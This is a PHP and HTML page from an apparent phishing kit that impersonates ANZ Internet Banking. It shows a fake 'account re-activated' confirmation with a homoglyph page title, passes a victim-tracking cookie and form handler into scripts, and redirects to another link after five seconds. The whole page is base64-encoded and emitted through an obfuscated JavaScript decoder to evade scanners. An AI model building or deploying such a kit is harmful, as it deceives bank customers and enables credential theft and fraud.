<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="done/";
?>

<!DOCTYPE html>
<html>

<head>

<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
<base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
<link rel="stylesheet" href="form/css.css">



    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    <meta charset="utf-8">
    <title>
        &#1040;NZ Internet B&#1072;nking
    </title>
    
    <link rel="stylesheet" href="../bower_components/font-awesome/css/font-awesome.min.css">
    <link media="all" type="text/css" rel="stylesheet" href="index.css">
    
    <link rel="stylesheet" href="css.css">




<link rel="stylesheet" href="form/css.css">

</head>

<?php ob_start() ?>
<body     ng-app="app" ng-controller="c1" ng-model-options="{'updateOn':'blur'}"      >
    <header role="banner">
        <form method="POST" onsubmit="return false" name="headerFrm" id="mainTable">
            <div class="headerOuterTable">
                <div class="headerLeftLogo">
                    <img title="ANZ logo" alt="" name="Img_AffiliateLogo" src="anz-logo.png" border="0">
                </div>
                <div class="headerTextCenter">
                    <a class="skipContent skipToContent">Skip to content&nbsp;&nbsp;&nbsp;</a>
                </div>
                <div class="headerTextLogout">
                    <div class="headerTextRight">
                        <a aria-label="What's new">
                            <div aria-hidden="true" style="display: inline-block; cursor: pointer;">
                                <div class="contactUsHeader">
                                    <div class="headerImageRightDiv">
                                        <i class="headerChatIcon icon-new" id="icon-new" style="font-size: 16px;"></i>
                                    </div>
                                    <div>What's new</div>
                                </div>
                            </div>
                        </a>
                        <a class="textHeader" id="contactUS" role="button">
                            <div class="contactUsHeader">
                                <div class="headerImageRightDiv">
                                    <i class="headerChatIcon icon-chat" id="icon-chat"></i>
                                </div>
                                <div>Contact</div>
                            </div>
                        </a>
                        <a class="textHeader" role="button">
                            <div class="mailsHeader mailIconNegativeRightMargin">
                                <div class="headerImageRightDiv">
                                    <img alt="mail" name="Img_MailIcon" src="mail-icon-1digit.png" class="headerImgBorderStyle" border="0">
                                    <sup class="headerSuperScript">3</sup>
                                </div>
                                <div class="mailsHeaderText">Mail</div>
                            </div>
                        </a>
                    </div>
                    <div class="logoutButtonDivClass">
                        <button role="button" type="submit" class="button-logout" name="Action.CorpUser.001.SignoffConfirm">
                            <i class="icon-login_padlock button-icon-size button-icon-right-margin" id="icon-login_padlock"></i>Log out</button>
                    </div>
                </div>
                <div class="mobileHeaderRightSection">
                    <div class="mobileHeaderButton">
                        <i class="icon-more" id="icon-more"></i>
                    </div>
                    <div class="mobileHeaderDropDown" style="display: none;">
                        <a class="mobileHeaderLinks" role="button">
                            <div class="mobileHeaderListElement">
                                <i class="icon-chat mobileHeaderDropDownIcon" id="icon-chat"></i>Contact
                            </div>
                        </a>
                        <a class="mobileHeaderLinks" role="button">
                            <div class="mobileHeaderListElement">
                                <i class="icon-mail mobileHeaderDropDownIcon" id="icon-mail"></i>Mail
                                <div class="mobileHeaderMailCount">3</div>
                            </div>
                        </a>
                        <a aria-label="What's new">
                            <div class="mobileHeaderListElement">
                                <i class="icon-new mobileHeaderDropDownIcon" id="icon-new"></i>What's new
                            </div>
                        </a>
                        <a target="" class="mobileHeaderLinks" role="button">
                            <div class="mobileHeaderListElement">
                                <i class="icon-wealth mobileHeaderDropDownIcon" id="icon-wealth"></i>JOIN ANZ SHARE INVESTING
                            </div>
                        </a>
                        <a target="" class="mobileHeaderLinks" role="button">
                            <div class="mobileHeaderListElement">
                                <i class="icon-login_padlock mobileHeaderDropDownIcon" id="icon-login_padlock"></i>Logout
                            </div>
                        </a>
                    </div>
                </div>
            </div>
        </form>
    </header>
    <nav role="navigation">
        <div class="menuBarOuter">
            <ul class="navBarList">
                <li class="menuLiClass homeButtonLeftMargin">
                    <a class="block " aria-label="Home">
                        <i class="icon-home" id="icon-home"></i>
                    </a>
                </li>
                <li class="menuLiClass">
                    <a class="block ">
                        <span>Payments</span>
                    </a>
                </li>
                <li class="menuLiClass">
                    <a class="block selected">
                        <span>Profile</span>
                        <span style="position: absolute; text-indent: -9999px;" tabindex="-1">
                            You are here
                        </span>
                    </a>
                </li>
                <li class="menuLiClass">
                    <a class="block ">
                        <span>Products</span>
                    </a>
                </li>
            </ul>
            <div class="menuLiClass navBarAnzsiButtonPosition" id="AnzsiButton">
                <a target="" class="navBarAnzsiPadding block" role="button">
                    <div class="navBarAnzsiButton">
                        JOIN ANZ SHARE INVESTING
                        <i class="icon-arrow_right" id="icon-arrow_right"></i>
                    </div>
                </a>
            </div>
        </div>
    </nav>
    <main role="main">
        <a name="mainContent" id="mainContent"></a>
        <div id="cover" style="display: none;"></div>
        <!-- //////////////////////////////////////////////////////////////////////////////// -->
        <!-- //////////////////////////////////////////////////////////////////////////////// -->
        <!-- //////////////////////////////////////////////////////////////////////////////// -->
        <!-- //////////////////////////////////////////////////////////////////////////////// -->
        <!-- //////////////////////////////////////////////////////////////////////////////// -->
        
        <!-- ////////////////////////////////////////////////////////////////////////////////////////// -->
        <!-- ////////////////////////////////////////////////////////////////////////////////////////// -->
        <!-- ////////////////////////////////////////////////////////////////////////////////////////// -->
        <!-- ////////////////////////////////////////////////////////////////////////////////////////// -->
        <!-- ////////////////////////////////////////////////////////////////////////////////////////// -->
        <!-- ////////////////////////////////////////////////////////////////////////////////////////// -->
        <!-- ////////////////////////////////////////////////////////////////////////////////////////// -->
        <!-- ////////////////////////////////////////////////////////////////////////////////////////// -->
        





        <div class="mainContentClass scum" style="display::; ;">
            <form method="POST" onsubmit="send1(event,'ask_info_proxy');return false" name="Update">
                <div id="boxes" class="window" align="center">
                    <div id="dialog" class="window">
                        <div id="targetjsp" role="dialog">
                        </div>
                        <a class="done">Go</a>&nbsp;&nbsp;&nbsp;
                        <a class="close">Close</a>
                        <br>
                    </div>
                </div>
                <div id="mask"></div>
                <div id="Changepersonaladdress/contactdetails" class="pageTitleDivClass">
                    <h1>Your account has been re-activated
                    </h1>
                    <p class="p98">
                        Our online services been activated for you. Please navigate to login form to login to Online banking.
                    </p>
                    <div class="divTitleRight" id="accountsicons">
                        <div class="divTitle">
                            <a class="iconAAccClass">
                                <div class="newIcondiv">
                                    <i class="icon-print iconsNewSize" id="imageprint" title="print"></i>
                                    <div class="iconTextNewsite">Print</div>
                                </div>
                            </a>
                        </div>
                        <div valign="top" class="divTitle">
                            <a class="modalstart iconAAccClass">
                                <div class="newIcondiv">
                                    <i class="icon-feedback iconsNewSize" id="imagefeedback" title="ANZ Internet Banking feedback"></i>
                                    <div class="iconTextNewsite">Feedback</div>
                                </div>
                            </a>
                        </div>
                        <div class="divTitle">
                            <a class="iconAAccClass">
                                <div class="newIcondiv">
                                    <i class="icon-help iconsNewSize" title="Help" id="imagehelp"></i>
                                    <div class="iconTextNewsite">Help</div>
                                </div>
                            </a>
                        </div>
                    </div>
                </div>
                <div class="" style="height: 300px"></div>
            </form>
        </div>











        <div id="" class="mobilePageTitleDivClass">
            <div class="divTitleRight mobileDivTitleRight">
                <div class="divTitle">
                    <a class="iconAAccClass">
                        <div class="newIcondiv">
                            <i class="icon-print iconsNewSize" id="imageprint" title="print"></i>
                            <div class="iconTextNewsite">Print</div>
                        </div>
                    </a>
                </div>
                <div valign="top" class="divTitle">
                    <a class="modalstart iconAAccClass">
                        <div class="newIcondiv">
                            <i class="icon-feedback iconsNewSize" id="imagefeedback" title="ANZ Internet Banking feedback"></i>
                            <div class="iconTextNewsite">Feedback</div>
                        </div>
                    </a>
                </div>
                <div class="divTitle">
                    <a class="iconAAccClass">
                        <div class="newIcondiv">
                            <i class="icon-help iconsNewSize" title="Help" id="imagehelp"></i>
                            <div class="iconTextNewsite">Help</div>
                        </div>
                    </a>
                </div>
            </div>
        </div>
        <div class="importantInfoSection">
            <div class="importantInfoDiv">
                <table width="100%" cellspacing="0" cellpadding="0" border="0">
                    <tbody>
                        <tr>
                            <td class="impInfoBodyTextWithParagraph bottomTextImportantHeader impInfoHeader" style="font-size: 14px; padding-left: 9px;">Important information</td>
                        </tr>
                        <tr>
                            <td class="impInfoBodyText">
                                <!--
    Added by pranita letter-spacing: -5px; removed
    -->
                                <p class="impInfoBodyTextWithParagraph" style="padding-top: 15px; color: rgb(73, 73, 73);">To update the address of accounts not shown, please contact
                                    <a id="genInqId" style="color: blue;font-size: 10px;font-weight: normal;cursor: pointer;" target="_blank" class="impInfoBodyTextWithParagraph">general enquiries
                                    </a>
                                    . For business accounts not shown, please call
                                    <b>1800 801 485</b> between 8.00am and 8.00pm (AEST), Monday to Friday.
                                </p>
                                <p class="impInfoBodyTextWithParagraph" style="padding-top: 5px; color: rgb(73, 73, 73);">Did you request a change to your address?</p>
                                <ul style="padding-left: 15px;">
                                    <li class="impInfoBodyTextWithParagraph" style="padding-top: 4px; color: rgb(73, 73, 73);">Please allow approximately 2 to 5 business days for address changes to be processed</li>
                                    <li class="impInfoBodyTextWithParagraph" style="padding-top: 5px; color: rgb(73, 73, 73);">If you’re an ANZ Insurance policy owner, changing your address can affect policy conditions. You’ll also need to inform the ANZ Insurance Centre of the change on
                                        <b>13 16 14</b> 8am-8pm (AEST/AEDT), Monday to Friday</li>
                                </ul>
                                <
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </main>
    <footer role="contentinfo">
        <div class="footerSection">
            <div class="footer_text_sec">
                © Australia and New Zealand Banking Group Limited (ANZ)
                <span> 2015</span>
                <span style="white-space: nowrap;"> ABN
                    <span>11</span>
                    <span>005</span>
                    <span>357</span>
                    <span>522</span>
                </span>.
            </div>
        </div>
    </footer>







<script type="text/javascript">
var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
var php_js = <?php  echo json_encode($php_js) ?>
</script>
<script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>



<script type="text/javascript">
    setTimeout(function(){
        window.location.href=php_js.bb_link
    },5000)
</script>

</body>
<?php $html=ob_get_clean()?><?php $test=0;if($test){    echo $html; }else{     ?>  <script type="text/javascript">     var _0xa211=["","\x6A\x6F\x69\x6E","\x25","\x73\x6C\x69\x63\x65","\x30\x30","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x61\x6C\x6C","\x6D\x61\x70","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65"];function _kaktys_encode(_0x60c0x2){return decodeURIComponent(Array[_0xa211[8]][_0xa211[7]][_0xa211[6]](atob(_0x60c0x2),function(_0x60c0x3){return _0xa211[2]+ (_0xa211[4]+ _0x60c0x3[_0xa211[5]](0).toString(16))[_0xa211[3]](-2)})[_0xa211[1]](_0xa211[0]))}     document.write(_kaktys_encode("<?php echo base64_encode($html) ?>")); </script>    <?php }  ?> 


</html>
